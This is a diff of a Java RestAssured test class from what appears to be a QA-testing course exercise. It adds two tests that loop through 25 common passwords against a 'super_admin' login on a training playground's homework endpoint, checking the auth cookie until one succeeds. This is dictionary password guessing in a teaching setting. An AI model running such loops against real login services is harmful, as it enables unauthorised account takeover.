@@ -5,6 +5,7 @@ import io.restassured.path.json.JsonPath;
 import io.restassured.response.Response;
 import org.junit.jupiter.api.Test;
 
+import java.util.Arrays;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
@@ -86,9 +87,9 @@ public class HellowWorld {
         System.out.println("Статус до завершения задачи - " + statusBefore);
 
         // Шаг 3: ожидание нужного количества секунд
-       int secondsToWait = response.jsonPath().getInt("seconds");
+        int secondsToWait = response.jsonPath().getInt("seconds");
         // Переводим секунды в миллисекунды
-       Thread.sleep(secondsToWait * 1000);
+        Thread.sleep(secondsToWait * 1000);
 
 
         // Шаг 4: запрос с токеном после завершения задачи
@@ -109,4 +110,116 @@ public class HellowWorld {
             System.out.println("Результат еще не готов.");
         }
     }
+
+
+    @Test
+    public void helloWorld6() {
+        String login = "super_admin";
+        List<String> passwords = Arrays.asList(
+                "123456", "password", "12345678", "qwerty", "123456789",
+                "12345", "1234", "111111", "1234567", "dragon",
+                "123123", "baseball", "abc123", "football", "monkey",
+                "letmein", "696969", "shadow", "master", "666666",
+                "qwertyuiop", "123321", "mustang", "1234567890", "michael"
+        );
+
+        for (String password : passwords) {
+            String authCookie = getAuthCookie(login, password);
+            if (authCookie != null) {
+                String authResult = checkAuthCookie(authCookie);
+                if (authResult.equals("You are authorized")) {
+                    System.out.println("Login: " + login);
+                    System.out.println("Password: " + password);
+                    System.out.println("Authentication result: " + authResult);
+                    System.out.println("Правильный пароль: " + password);
+                    break;
+                }
+            }
+        }
+    }
+
+    public static String getAuthCookie(String login, String password) {
+        Response response = RestAssured
+                .given()
+                .formParam("login", login)
+                .formParam("password", password)
+                .when()
+                .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                .andReturn();
+        return response.getCookie("auth_cookie");
+    }
+
+    public static String checkAuthCookie(String authCookie) {
+        Response response = RestAssured
+                .given()
+                .cookie("auth_cookie", authCookie)
+                .when()
+                .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
+                .andReturn();
+        return response.getBody().asString();
+
+
+    }
+
+
+    @Test
+    public void checkPassword() {
+        String login = "super_admin";
+        List<String> passwords = Arrays.asList(
+                "123456", "password", "12345678", "qwerty", "123456789",
+                "12345", "1234", "111111", "1234567", "dragon",
+                "123123", "baseball", "abc123", "football", "monkey",
+                "letmein", "696969", "shadow", "master", "666666",
+                "qwertyuiop", "123321", "mustang", "1234567890", "michael"
+        );
+
+        for (String password : passwords) {
+            String authCookie = getAuthCookie1(login, password);
+            if (authCookie != null) {
+                String authResult = checkAuthCookie2(authCookie);
+                if (authResult.equals("You are authorized")) {
+                    System.out.println("Правильный пароль: " + password);
+                    break;
+                }else {
+                    System.out.println(" Вам не повезло. ");
+                    System.out.println(" Пароль не правильный - " + password);
+                }
+            }
+        }
+    }
+
+    public static String getAuthCookie1(String login, String password) {
+        Response response = RestAssured
+                .given()
+                .formParam("login", login)
+                .formParam("password", password)
+                .when()
+                .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                .andReturn();
+
+        Headers mmm = response.getHeaders();
+        System.out.println("\nЗаголовки - \n" + mmm);
+
+        return response.getCookie("auth_cookie");
+    }
+
+    public static String checkAuthCookie2(String authCookie) {
+        Response response = RestAssured
+                .given()
+                .cookie("auth_cookie", authCookie)
+                .when()
+                .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
+                .andReturn();
+
+        Headers mmm = response.getHeaders();
+        System.out.println("\nЗаголовки - \n" + mmm);
+
+        return response.getBody().asString();
+
+    }
 }
+
+
+
+
+
